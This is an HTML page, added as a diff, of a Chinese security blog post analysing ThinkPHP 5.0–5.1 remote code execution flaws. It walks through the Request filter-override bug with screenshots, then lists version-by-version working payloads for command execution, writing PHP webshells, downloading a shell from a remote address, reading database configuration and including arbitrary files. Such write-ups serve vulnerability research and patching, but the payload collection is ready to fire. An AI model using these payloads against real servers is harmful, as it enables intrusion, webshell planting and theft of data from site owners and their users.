@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2023/12/25/ThinkPHP%20v5.x%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%94%B6%E9%9B%86/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/ThinkPHP%20v5.x%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%94%B6%E9%9B%86/","path":"2023/12/25/ThinkPHP v5.x RCE漏洞分析与收集/","title":"ThinkPHP v5 RCE漏洞分析与收集"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ThinkPHP v5 RCE漏洞分析与收集 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-text">复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%90%AFdebug"><span class="nav-text">开启debug</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AA%E5%BC%80%E5%90%AFdebug"><span class="nav-text">未开启debug</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B"><span class="nav-text">流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%B6%E9%9B%86"><span class="nav-text">收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-0-amp-5-0-1-5-0-7"><span class="nav-text">5.0&amp;5.0.1-5.0.7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-0-8-5-0-13"><span class="nav-text">5.0.8-5.0.13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-0-14-5-0-23"><span class="nav-text">5.0.14-5.0.23</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-0-24"><span class="nav-text">5.0.24</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%AA%E5%BC%80%E5%90%AF%E5%BC%BA%E5%88%B6%E8%B7%AF%E7%94%B1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">未开启强制路由命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%B6%E9%9B%86-1"><span class="nav-text">收集</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/ThinkPHP%20v5.x%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%94%B6%E9%9B%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ThinkPHP v5 RCE漏洞分析与收集 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ThinkPHP v5 RCE漏洞分析与收集
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ThinkPHP%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" itemprop="url" rel="index"><span itemprop="name">ThinkPHP漏洞集合</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>具体分析 <a target="_blank" rel="noopener" href="http://www.yongsheng.site/2022/04/25/TP5%E6%94%B9%E9%80%A0/">ThinkPHPv5 RCE改造 | Y0ng的博客 (yongsheng.site)</a></p>
+<p>Thinkphp5 rce分两个大版本</p>
+<ol>
+<li>   ThinkPHP 5.0-5.0.24</li>
+<li>   ThinkPHP 5.1.0-5.1.30</li>
+</ol>
+<p>方法主要分为两种</p>
+<p><code>1.Request中的filter变量覆盖导致RCE 分开启debug和不开启debug</code> 两种情况</p>
+<p><code>2.路由控制不严谨导致的RCE</code></p>
+<p>先分析第一种rce 即 <code>method __contruct导致的rce</code></p>
+<p>这里用5.0.5分析</p>
+<a id="more"></a>
+
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>poc</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">POST：</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;system</span><br></pre></td></tr></table></figure>
+
+<h2 id="开启debug"><a href="#开启debug" class="headerlink" title="开启debug"></a>开启debug</h2><p>当 <code>application\config.php    中的app_debug = true</code></p>
+<p>单入口文件</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b1e2b08dc3d44dcfaab4d1d9108142dd.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/a3875bfeb8f24e128b74dc6c8b1ef990.png"></p>
+<p>进入<code>run()</code> 方法</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/09256c2ce9694cb28331ec0802a692d6.png"></p>
+<p>首先初始化<code>$request</code> 这个数组，<code>self::initCommon()</code>;初始化公共配置。未设置调度信息则进行 URL 路由检测 <code>self::routeCheck($request, $config)</code> 默认进入。</p>
+<p>跟进 routeCheck()</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/a7593d0362494070b5c032ae33e7b48c.png"></p>
+<p>默认<code>self::$routeCheck</code> <code>self::$routemust</code> 为空，整体流程看图</p>
+<p>跟进 <code>Route::check</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f0ace01c7f9b4174ad8909d6a3589d49.png"></p>
+<p>进入到Request.php中的method()方法中</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/ab29f838e3ac4f25bb2d851bc78c8a6a.png"></p>
+<p>首先进入<code>elseif分支</code>，接着 <code>isset($_POST[Config::get(&#39;var_method&#39;)])</code> ， <code>var_method 默认为 _method</code></p>
+<p>并执行 <code>$this-&gt;&#123;$this-&gt;method&#125;($_POST)</code> 语句。因此通过<code>指定_method</code>即可完成 <code>对该类的任意方法的调用</code>，其传入对应的参数即对应的$_POST数组。</p>
+<p>这里利用的地方是 <code>__construct()</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/c82b887a0f054af5a8f171db4731be99.png"></p>
+<p>所以当我们post传入<br><code>s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system</code> 时</p>
+<p><code>_method触发__construct</code> ，<code>filter覆盖参数为system</code> ，<code>method覆盖为POST</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f35dee589d5647d4ac790630adb52749.png"></p>
+<p>然后一路返回到run()</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/eb2af877ab0549c7a50f8d0993c0826f.png"></p>
+<p>因为此时开启debug，进入if 进入<code>$request-&gt;param()</code></p>
+<p>param()</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/504a986fa93f42a7b7265d5a6c45428e.png"></p>
+<p>进入<code>input()</code> 函数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/09124093039d48149f7427898e9a51f5.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/3c66457317324bfaa6ba438a0242d4a7.png"></p>
+<p><code>array_walk_recursive() </code><br>对数组中的每个元素应用用户自定义函数，也就是说 <code>调用filterValue()</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/1826311d22704305b57caf6ff1a697eb.png"></p>
+<h2 id="未开启debug"><a href="#未开启debug" class="headerlink" title="未开启debug"></a>未开启debug</h2><p>5.0.x 跟 5.1.x 代码差异较大</p>
+<p>所以payload 也不尽相同</p>
+<p>以 <a target="_blank" rel="noopener" href="https://www.easy233.top/2020/12/11/thinkphp5-rce-zong-jie/#toc-heading-5">参考</a> 为例子</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/39523143e3614b18a43a708a9e0c4577.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p><code>$this-&gt;method</code> 可控导致可以调用<code>__contruct()覆盖Request类的filter字段</code>，然后<code>App::run()</code> 执行判断debug来决定是否执行 <code>$request-&gt;param()</code>，并且还有<code>$dispatch[&#39;type&#39;]</code> 等于<code>controller</code>或者 <code>method</code> 时会执行 <code>$request-&gt;param()</code>，而<code>$request-&gt;param()</code>会进入到 <code>input()</code> 方法，在这个方法中将被覆盖的filter回调call_user_func()，造成rce</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/7df49593ac2640bdbf20d3914ef98103.png"></p>
+<h1 id="收集"><a href="#收集" class="headerlink" title="收集"></a>收集</h1><p>基于__construct的payload大部分出现在 <code>5.0.x</code> 及低版本的 <code>5.1.x</code> 中。</p>
+<h2 id="5-0-amp-5-0-1-5-0-7"><a href="#5-0-amp-5-0-1-5-0-7" class="headerlink" title="5.0&amp;5.0.1-5.0.7"></a>5.0&amp;5.0.1-5.0.7</h2><p>与debug无关</p>
+<p>命令执行rce</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST </span><br><span class="line">?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;system</span><br><span class="line">aaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;system</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoami</span><br></pre></td></tr></table></figure>
+<p>写入木马getshell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-0-8-5-0-13"><a href="#5-0-8-5-0-13" class="headerlink" title="5.0.8-5.0.13"></a>5.0.8-5.0.13</h2><p>与debug无关</p>
+<p>命令执行rce</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;system</span><br><span class="line">aaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoami</span><br><span class="line">c&#x3D;system&amp;f&#x3D;calc&amp;_method&#x3D;filter</span><br></pre></td></tr></table></figure>
+
+<p>写入木马getshell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">s&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-0-14-5-0-23"><a href="#5-0-14-5-0-23" class="headerlink" title="5.0.14-5.0.23"></a>5.0.14-5.0.23</h2><p>默认debug=flase，需要开启debug才能命令执行。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;system</span><br><span class="line">aaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoami</span><br><span class="line">c&#x3D;system&amp;f&#x3D;calc&amp;_method&#x3D;filter</span><br></pre></td></tr></table></figure>
+<p>写入木马getshell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">s&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert</span><br><span class="line">#5.0.21以后</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;assert&amp;server[REQUEST_METHOD]&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)</span><br></pre></td></tr></table></figure>
+<p>有captcha路由时无需debug=true</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST </span><br><span class="line">?s&#x3D;captcha&#x2F;calc</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;GET</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-0-24"><a href="#5-0-24" class="headerlink" title="5.0.24"></a>5.0.24</h2><p>最后一个版本RCE被修复</p>
+<h1 id="未开启强制路由命令执行"><a href="#未开启强制路由命令执行" class="headerlink" title="未开启强制路由命令执行"></a>未开启强制路由命令执行</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3570#toc-1">[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录</a></p>
+<p><a target="_blank" rel="noopener" href="https://hyasin.github.io/2020/09/08/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP漏洞分析</a></p>
+<h2 id="收集-1"><a href="#收集-1" class="headerlink" title="收集"></a>收集</h2><p>命令执行</p>
+<p>5.0.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
+<p>5.1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;think\request&#x2F;input?data[]&#x3D;phpinfo()&amp;filter&#x3D;assert</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Think&#x2F;__call&amp;method&#x3D;display&amp;params[]&#x3D;&lt;?php system(&#39;whoami&#39;); ?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
+<p>写shell</p>
+<p>5.0.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;copy(%27远程地址%27,%27333.php%27)</span><br></pre></td></tr></table></figure>
+<p>5.1.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Think&#x2F;display&amp;template&#x3D;&lt;?php phpinfo();?&gt;             &#x2F;&#x2F;shell生成在runtime&#x2F;temp&#x2F;md5(template).php</span><br><span class="line">?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;copy(&#39;远程地址&#39;,&#39;333.php&#39;)</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其他</p>
+<p>5.0.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username &#x2F;&#x2F; 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    &#x2F;&#x2F; 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     &#x2F;&#x2F; 包含任意.php文件</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://y4er.com/post/thinkphp5-rce/">Thinkphp5 RCE总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.easy233.top/2020/12/11/thinkphp5-rce-zong-jie/#toc-heading-6">thinkphp5-rce-zong-jie</a></p>
+<p><a target="_blank" rel="noopener" href="https://m0re.top/posts/86389a60/">ThinkPHP5.x版本RCE漏洞分析与收集</a></p>
+<p><a target="_blank" rel="noopener" href="https://hyasin.github.io/2020/09/08/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 漏洞分析总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://hack-for.fun/a45.html">ThinkPHP5漏洞学习-RCE</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/25/ThinkPHP%20v6.0.9%20eval%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/" rel="prev" title="ThinkPHP v6.0.9-12 eval反序列化代码执行 分析">
+                  <i class="fa fa-angle-left"></i> ThinkPHP v6.0.9-12 eval反序列化代码执行 分析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/25/ThinkPHP%20v5.1.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%88%86%E6%9E%90/" rel="next" title="ThinkPHP v5.1.x 反序列化 分析">
+                  ThinkPHP v5.1.x 反序列化 分析 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
